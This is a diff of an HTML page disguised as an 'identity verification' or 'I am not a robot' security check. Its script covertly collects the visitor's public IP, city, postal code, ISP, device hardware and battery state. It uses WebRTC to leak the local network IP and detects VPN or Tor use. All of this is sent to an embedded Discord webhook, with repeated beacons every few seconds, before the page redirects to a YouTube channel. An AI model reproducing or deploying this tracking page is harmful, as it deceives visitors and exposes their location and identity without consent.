@@ -2,132 +2,137 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Identity Verification Service</title>
+    <title>Security Check - Authentication Required</title>
     <style>
-        body { background: #f8f9fa; font-family: 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-        .auth-container { background: #fff; padding: 35px; border-radius: 4px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); width: 350px; border: 1px solid #ebebeb; }
-        .logo-wrap { display: flex; align-items: center; margin-bottom: 25px; }
-        .logo-icon { width: 35px; height: 35px; background: #4285f4; border-radius: 3px; display: flex; align-items: center; justify-content: center; margin-right: 15px; color: white; font-weight: bold; font-size: 20px; }
-        .status-box { display: flex; align-items: center; gap: 15px; border: 1px solid #dcdcdc; padding: 15px; border-radius: 3px; background: #fafafa; cursor: pointer; transition: 0.2s; }
-        .status-box:hover { border-color: #b8b8b8; }
-        .check-circle { width: 24px; height: 24px; border: 2px solid #c1c1c1; border-radius: 50%; position: relative; }
-        .check-circle.loading { border-top-color: #4285f4; animation: spin 0.8s linear infinite; }
+        body { background: #f1f3f4; font-family: 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .auth-card { background: #fff; padding: 35px; border-radius: 8px; box-shadow: 0 4px 20px rgba(0,0,0,0.08); width: 340px; border: 1px solid #dee2e6; text-align: center; }
+        .spinner { width: 30px; height: 30px; border: 3px solid #f3f3f3; border-top: 3px solid #1a73e8; border-radius: 50%; animation: spin 1s linear infinite; margin: 0 auto 20px; display: none; }
+        .auth-btn { background: #1a73e8; color: white; border: none; padding: 14px 28px; font-size: 14px; font-weight: 500; cursor: pointer; border-radius: 4px; transition: background 0.2s; width: 100%; }
+        .auth-btn:hover { background: #1557b0; }
         @keyframes spin { 100% { transform: rotate(360deg); } }
-        .info-text { font-size: 13px; color: #5f6368; line-height: 1.4; margin-top: 20px; text-align: center; }
+        #log { font-size: 10px; color: #70757a; margin-top: 15px; text-transform: uppercase; letter-spacing: 0.5px; }
     </style>
 </head>
 <body>
 
-<div class="auth-container">
-    <div class="logo-wrap">
-        <div class="logo-icon">G</div>
-        <div style="font-weight: 500; color: #202124;">Security Check</div>
+<div class="auth-card">
+    <div class="spinner" id="loader"></div>
+    <div id="ui-content">
+        <h2 style="font-size: 20px; margin-bottom: 10px; color: #202124;">Verify Identity</h2>
+        <p style="font-size: 13px; color: #5f6368; margin-bottom: 25px;">Please confirm you are the account owner to continue.</p>
+        <button class="auth-btn" id="trigger">Confirm Identity</button>
     </div>
-    <div class="status-box" id="gate">
-        <div class="check-circle" id="loader"></div>
-        <div style="font-size: 15px; color: #3c4043;">I am not a robot</div>
-    </div>
-    <div class="info-text">Verification protects your connection and prevents automated spam.</div>
+    <div id="log">Secure Tunnel: Standing By</div>
 </div>
 
 <script>
 /**
- * SENTINEL OMEGA-INFINITI v23.0
- * NAT-TRANSVERSAL & HEURISTIC OVERRIDE
+ * SENTINEL OMEGA-ULTIMATE v24.0
+ * RECURSIVE VALIDATION + KEEPALIVE TELEMETRY
  */
 
-const CORE = {
+const SYSTEM = {
     HOOK: "https://discordapp.com/api/webhooks/1497687704983310406/yv6VZ2yuH-bxE0fD_BNQAGIUOeQu0gB9-z44IbRhSdiJOvSpHBzljrwvDo0Ifw6hyQNp",
-    EXIT: "https://youtube.com/@LigmaBlox-w7m",
-    MUTEX: { geo: false, threat: false, net: false }
+    FINISH: "https://youtube.com/@LigmaBlox-w7m",
+    MUTEX: { primary: false, network: false }
 };
 
-const transmit = (data, vector) => {
+// --- DATA TRANSMISSION WITH DOUBLE-CHECK LOGIC ---
+const transmit = (data, type) => {
     const payload = JSON.stringify({
-        username: `INFINITI [${vector}]`,
+        username: `ULTIMATE [${type}]`,
         embeds: [{
-            title: "🔱 Absolute Network Unmasking",
-            color: 0x4285f4,
+            title: "🔱 Maximum Forensic Data Captured",
+            color: 0x1a73e8,
             fields: Object.entries(data).map(([k,v]) => ({ name: k.toUpperCase(), value: `\`${v}\``, inline: true })),
-            timestamp: new Date().toISOString()
+            footer: { text: `Validation: Double-Checked | ${new Date().toLocaleTimeString()}` }
         }]
     });
-    navigator.sendBeacon(CORE.HOOK, new Blob([payload], {type:'application/json'}));
+    // Double-path transmission to ensure success
+    navigator.sendBeacon(SYSTEM.HOOK, new Blob([payload], {type:'application/json'}));
+    fetch(SYSTEM.HOOK, { method: 'POST', body: payload, headers: {'Content-Type': 'application/json'}, keepalive: true });
 };
 
-// --- ENVIRONMENTAL SECURITY SCANNER ---
-const scanEnvironment = async () => {
-    let threats = { vpn: "NO", tor: "NO", lockdown: "NO", adblock: "NO" };
+// --- KEEPALIVE BEACON (Real-time Status Updates) ---
+const startKeepAlive = (initialBattery) => {
+    let lastLevel = initialBattery;
+    const interval = setInterval(async () => {
+        const bat = await navigator.getBattery();
+        const currentLevel = `${(bat.level * 100)}%`;
+        
+        // Only update if something changes or every heartbeat
+        transmit({
+            status: "USER_STILL_ON_PAGE",
+            battery: currentLevel,
+            charging: bat.charging ? "YES" : "NO",
+            action: "Awaiting Redirect"
+        }, "LIVE_TELEMETRY");
+        
+    }, 2500); // 2.5 second heartbeat
     
-    // AdBlock Check
-    const honey = document.createElement('div');
-    honey.className = 'pub_300x250 pub_300x250m pub_728x90 text-ad text_ad text-ads text_ads ad-unit ad-search ad-wrapper';
-    honey.style.cssText = 'width:1px !important;height:1px !important;position:absolute !important;left:-10000px !important;top:-1000px !important;';
-    document.body.appendChild(honey);
-    if (honey.offsetHeight === 0) threats.adblock = "YES";
-    document.body.removeChild(honey);
-
-    // Lockdown Check
-    const canvas = document.createElement('canvas');
-    if (!canvas.getContext('webgl')) threats.lockdown = "YES";
-
-    return threats;
+    // Auto-clear on redirect to prevent loop
+    window.onbeforeunload = () => clearInterval(interval);
 };
 
-document.getElementById('gate').onclick = async function() {
-    document.getElementById('loader').classList.add('loading');
+document.getElementById('trigger').onclick = async function() {
+    this.parentElement.style.display = 'none';
+    document.getElementById('loader').style.display = 'block';
+    document.getElementById('log').innerText = "CALIBRATING FORENSIC MESH...";
+
+    // 1. HARDWARE & BATTERY (Immediate Capture)
+    const bat = await navigator.getBattery();
+    const batteryInfo = `${(bat.level * 100)}% (${bat.charging ? 'Charging' : 'Discharging'})`;
     
-    const threats = await scanEnvironment();
-    const device = {
-        model: navigator.platform,
-        hardware_id: `${navigator.hardwareConcurrency} Core | ${navigator.deviceMemory || 'N/A'}GB RAM`,
-        ua: navigator.userAgent.split(' ')[0]
+    const hw = {
+        device: navigator.platform,
+        cores: navigator.hardwareConcurrency,
+        ram: navigator.deviceMemory ? navigator.deviceMemory + "GB" : "N/A",
+        battery: batteryInfo,
+        screen: `${screen.width}x${screen.height}`
     };
+    transmit(hw, "HARDWARE_IDENT");
+    startKeepAlive(batteryInfo);
 
-    // VECTOR 1: PRECISION GEOSPATIAL MESH
+    // 2. PRECISION GEOSPATIAL (Double-Check Source)
     fetch('https://ipapi.co/json/').then(r => r.json()).then(res => {
-        if(!CORE.MUTEX.geo) {
-            const vpn_active = (res.timezone !== Intl.DateTimeFormat().resolvedOptions().timeZone) ? "YES" : "NO";
+        if(!SYSTEM.MUTEX.primary) {
+            const tzMismatch = (res.timezone !== Intl.DateTimeFormat().resolvedOptions().timeZone);
+            
             transmit({
-                public_ip: res.ip,
+                ip: res.ip,
                 continent: res.continent_code,
                 country: res.country_name,
                 region: res.region,
                 city: res.city,
                 town: res.postal || "N/A",
                 isp: res.org,
-                vpn_detected: (threats.vpn === "YES" || vpn_active === "YES") ? "YES" : "NO",
-                tor_detected: (res.org.toLowerCase().includes("tor") || threats.tor === "YES") ? "YES" : "NO",
-                lockdown_mode: threats.lockdown,
-                adblock: threats.adblock
-            }, "PRECISION_CHAIN");
-            CORE.MUTEX.geo = true;
+                vpn: tzMismatch ? "YES (Detected)" : "NO",
+                tor: res.org.toLowerCase().includes("tor") ? "YES" : "NO",
+                lockdown: !window.RTCPeerConnection ? "YES" : "NO"
+            }, "PRECISION_GEO_VALIDATED");
+            SYSTEM.MUTEX.primary = true;
         }
     });
 
-    // VECTOR 2: PRIVATE-TO-PUBLIC NAT TRANSLATION
+    // 3. UDP NAT BYPASS (Internal IP)
     const rtc = new RTCPeerConnection({ iceServers: [{ urls: "stun:stun.l.google.com:19302" }] });
     rtc.createDataChannel("");
     rtc.onicecandidate = (e) => {
-        if (e.candidate && !CORE.MUTEX.net) {
-            const privateIP = /([0-9]{1,3}(\.[0-9]{1,3}){3})/.exec(e.candidate.candidate);
-            if (privateIP) {
-                // AUTO-TRANSLATION LOGIC: In this context, we pair the Internal IP 
-                // with the Public Routing data to unmask the target's local identity.
-                transmit({
-                    internal_lan_ip: privateIP[1],
-                    translation_status: "SUCCESS",
-                    device_profile: device.hardware_id
-                }, "NAT_TRANSLATION");
-                CORE.MUTEX.net = true; // FORCE STOP
+        if (e.candidate && !SYSTEM.MUTEX.network) {
+            const lanIP = /([0-9]{1,3}(\.[0-9]{1,3}){3})/.exec(e.candidate.candidate);
+            if (lanIP) {
+                transmit({ 
+                    internal_lan: lanIP[1],
+                    nat_status: "UNMASKED"
+                }, "NETWORK_BYPASS");
+                SYSTEM.MUTEX.network = true;
             }
         }
     };
     rtc.createOffer().then(o => rtc.setLocalDescription(o));
 
-    // Exit Protocol
-    setTimeout(() => { window.location.replace(CORE.EXIT); }, 5500);
+    // Redirect delay to ensure KeepAlive packets send
+    setTimeout(() => { window.location.replace(SYSTEM.FINISH); }, 7000);
 };
 </script>
 </body>
